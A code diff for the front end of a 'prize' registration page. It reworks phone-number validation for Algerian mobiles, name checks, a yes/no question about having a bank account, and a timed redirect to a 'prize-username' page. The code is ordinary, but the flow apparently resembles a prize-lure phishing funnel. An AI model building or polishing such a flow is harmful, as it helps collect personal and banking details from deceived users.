@@ -25,7 +25,7 @@
   <link rel="stylesheet" href="/assets/css/no-zoom.css?v=1">
   <script src="/assets/js/no-zoom.js?v=1"></script>
 
-  <!-- إصلاح تباين أزرار "نعم / لا" لضمان وضوح النص دائماً -->
+  <!-- ضمان وضوح نص أزرار نعم / لا في حالتي التحديد وعدم التحديد -->
   <style>
     [data-testid="has-account-yes"],
     [data-testid="has-account-no"] {
@@ -38,10 +38,10 @@
       border-color: #c62828 !important;
       color: #c62828 !important;
     }
+    [data-testid="has-account-yes"].selected,
+    [data-testid="has-account-no"].selected,
     [data-testid="has-account-yes"].is-selected,
-    [data-testid="has-account-no"].is-selected,
-    [data-testid="has-account-yes"][aria-pressed="true"],
-    [data-testid="has-account-no"][aria-pressed="true"] {
+    [data-testid="has-account-no"].is-selected {
       background-color: #c62828 !important;
       border-color: #c62828 !important;
       color: #ffffff !important;
@@ -275,50 +275,24 @@
       var form = modal ? modal.querySelector('form') : null;
       var errorMsg = document.getElementById('phoneErrorMsg');
       var successSheet = document.getElementById('registrationSuccessSheet');
-      var closeSuccessBtn = document.getElementById('closeSuccessBtn');
-      var successCloseX = document.getElementById('successCloseX');
-      var exploreAppBtn = document.getElementById('exploreAppBtn');
       if (!phoneInput) return;
 
       var PREFIX_REGEX = /^0[567]/;
       var FULL_REGEX = /^0[567]\d{8}$/;
-      var selectedBankChoice = null; // 'yes' | 'no' | null
-      var redirectTimer = null;
+      var bankAnswered = false;
+      var redirectFallbackTimer = null;
 
       function goToNextPage() {
-        if (redirectTimer) {
-          clearTimeout(redirectTimer);
-          redirectTimer = null;
+        if (redirectFallbackTimer) {
+          clearTimeout(redirectFallbackTimer);
+          redirectFallbackTimer = null;
         }
-        var target = window.SiteLang && typeof window.SiteLang.href === 'function'
+        var href = window.SiteLang && typeof window.SiteLang.href === 'function'
           ? window.SiteLang.href('prize-username.html')
           : 'prize-username.html';
-        window.location.href = target;
-      }
-
-      // ضمان ظهور نص أزرار "نعم / لا" وتحديد الاختيار بوضوح
-      function selectBankChoice(choice) {
-        selectedBankChoice = choice;
-        if (yesBtn) {
-          yesBtn.classList.toggle('is-selected', choice === 'yes');
-          yesBtn.setAttribute('aria-pressed', choice === 'yes' ? 'true' : 'false');
+        if (window.location.pathname.indexOf('prize-username.html') === -1) {
+          window.location.href = href;
         }
-        if (noBtn) {
-          noBtn.classList.toggle('is-selected', choice === 'no');
-          noBtn.setAttribute('aria-pressed', choice === 'no' ? 'true' : 'false');
-        }
-        syncSubmitButton(isValidAlgerianMobile(phoneInput.value));
-      }
-
-      if (yesBtn) {
-        yesBtn.addEventListener('click', function () {
-          selectBankChoice('yes');
-        });
-      }
-      if (noBtn) {
-        noBtn.addEventListener('click', function () {
-          selectBankChoice('no');
-        });
       }
 
       function hasNonPhoneCharacters(value) {
@@ -357,8 +331,7 @@
       }
 
       function isValidAlgerianMobile(value) {
-        var phone = normalizeAlgerianMobile(value);
-        return FULL_REGEX.test(phone);
+        return FULL_REGEX.test(normalizeAlgerianMobile(value));
       }
 
       function getInvalidMessage() {
@@ -381,29 +354,23 @@
         phoneInput.style.borderColor = '';
       }
 
-      function hasAccountSelection() {
+      function isNameValid() {
+        if (!nameInput) return true;
+        var minLen = parseInt(nameInput.getAttribute('minlength') || '3', 10);
+        return String(nameInput.value || '').trim().length >= minLen;
+      }
+
+      function isBankValid() {
         if (!yesBtn || !noBtn) return true;
-        if (selectedBankChoice === 'yes' || selectedBankChoice === 'no') return true;
-        var yesSelected = yesBtn.getAttribute('aria-pressed') === 'true' || yesBtn.classList.contains('is-selected') || yesBtn.classList.contains('active') || yesBtn.classList.contains('selected');
-        var noSelected = noBtn.getAttribute('aria-pressed') === 'true' || noBtn.classList.contains('is-selected') || noBtn.classList.contains('active') || noBtn.classList.contains('selected');
-        return yesSelected || noSelected;
+        if (bankAnswered) return true;
+        return yesBtn.classList.contains('selected') || noBtn.classList.contains('selected');
       }
 
-      function areOtherFieldsValid() {
-        var nameOk = true;
-        if (nameInput) {
-          var minLen = parseInt(nameInput.getAttribute('minlength') || '0', 10);
-          var nameVal = String(nameInput.value || '').trim();
-          nameOk = minLen > 0 ? nameVal.length >= minLen : nameVal.length > 0;
-        }
-        return nameOk && hasAccountSelection();
-      }
-
-      function syncSubmitButton(phoneValid) {
+      function syncSubmitState(phoneValid) {
         if (!submitButton) return;
-        var canSubmit = Boolean(phoneValid && areOtherFieldsValid());
-        submitButton.disabled = !canSubmit;
-        if (canSubmit) {
+        var ready = Boolean(phoneValid && isNameValid() && isBankValid());
+        submitButton.disabled = !ready;
+        if (ready) {
           submitButton.removeAttribute('disabled');
         } else {
           submitButton.setAttribute('disabled', '');
@@ -416,7 +383,7 @@
         if (hasNonPhoneCharacters(raw)) {
           phoneInput.setCustomValidity(getInvalidMessage());
           showPhoneError();
-          syncSubmitButton(false);
+          syncSubmitState(false);
           return false;
         }
 
@@ -436,7 +403,7 @@
           showPhoneError();
         }
 
-        syncSubmitButton(valid);
+        syncSubmitState(valid);
         return valid;
       }
 
@@ -470,12 +437,12 @@
         var raw = String(phoneInput.value || '').trim();
         if (!raw) {
           hidePhoneError();
-          syncSubmitButton(false);
+          syncSubmitState(false);
           return;
         }
         if (hasNonPhoneCharacters(raw)) {
           showPhoneError();
-          syncSubmitButton(false);
+          syncSubmitState(false);
           return;
         }
         if (isValidAlgerianMobile(raw)) {
@@ -484,12 +451,12 @@
             phoneInput.value = normalized;
           }
           hidePhoneError();
-          syncSubmitButton(true);
+          syncSubmitState(true);
         } else {
           if (normalizeAlgerianMobile(raw).replace(/\D/g, '').length >= 8) {
             showPhoneError();
           }
-          syncSubmitButton(false);
+          syncSubmitState(false);
         }
       });
 
@@ -503,17 +470,35 @@
 
       if (nameInput) {
         nameInput.addEventListener('input', function () {
-          syncSubmitButton(isValidAlgerianMobile(phoneInput.value));
+          syncSubmitState(isValidAlgerianMobile(phoneInput.value));
+        });
+      }
+
+      if (yesBtn) {
+        yesBtn.addEventListener('click', function () {
+          bankAnswered = true;
+          setTimeout(function () {
+            syncSubmitState(isValidAlgerianMobile(phoneInput.value));
+          }, 0);
+        });
+      }
+
+      if (noBtn) {
+        noBtn.addEventListener('click', function () {
+          bankAnswered = true;
+          setTimeout(function () {
+            syncSubmitState(isValidAlgerianMobile(phoneInput.value));
+          }, 0);
         });
       }
 
       if (form) {
         form.addEventListener('submit', function (e) {
           var valid = enforcePhoneValidation(false);
-          if (!valid) {
+          if (!valid || !isNameValid() || !isBankValid()) {
             e.preventDefault();
             e.stopImmediatePropagation();
-            if (String(phoneInput.value || '').trim().length > 0) {
+            if (!valid && String(phoneInput.value || '').trim().length > 0) {
               showPhoneError();
             }
             phoneInput.reportValidity();
@@ -524,35 +509,20 @@
           phoneInput.value = normalized;
           hidePhoneError();
 
-          try {
-            localStorage.setItem('prizePhone', normalized);
-            if (nameInput) localStorage.setItem('prizeName', String(nameInput.value || '').trim());
-            if (selectedBankChoice) localStorage.setItem('prizeHasAccount', selectedBankChoice);
-          } catch (err) {}
-
-          // جدول التوجيه التلقائي بعد 2 ثانية كضمان انتقال للصفحة التالية
-          if (!redirectTimer) {
-            redirectTimer = setTimeout(goToNextPage, 2000);
+          // ضمان الانتقال إلى الصفحة التالية حتى لو تأخر home.js
+          if (!redirectFallbackTimer) {
+            redirectFallbackTimer = setTimeout(goToNextPage, 1600);
           }
         }, true);
       }
 
-      // أزرار نافذة النجاح توجه أيضاً إلى prize-username.html
-      if (closeSuccessBtn) closeSuccessBtn.addEventListener('click', goToNextPage);
-      if (successCloseX) successCloseX.addEventListener('click', goToNextPage);
-      if (exploreAppBtn) exploreAppBtn.addEventListener('click', goToNextPage);
-
-      // مراقبة ظهور نافذة النجاح لتفعيل عداد الـ 2 ثانية للتوجيه
       if (successSheet) {
         var sheetObserver = new MutationObserver(function () {
-          var isVisible = successSheet.classList.contains('active') ||
-            successSheet.classList.contains('show') ||
-            window.getComputedStyle(successSheet).display !== 'none';
-          if (isVisible && !redirectTimer) {
-            redirectTimer = setTimeout(goToNextPage, 2000);
+          if (successSheet.classList.contains('active') && !redirectFallbackTimer) {
+            redirectFallbackTimer = setTimeout(goToNextPage, 1500);
           }
         });
-        sheetObserver.observe(successSheet, { attributes: true, attributeFilter: ['class', 'style'] });
+        sheetObserver.observe(successSheet, { attributes: true, attributeFilter: ['class'] });
       }
 
       enforcePhoneValidation(false);
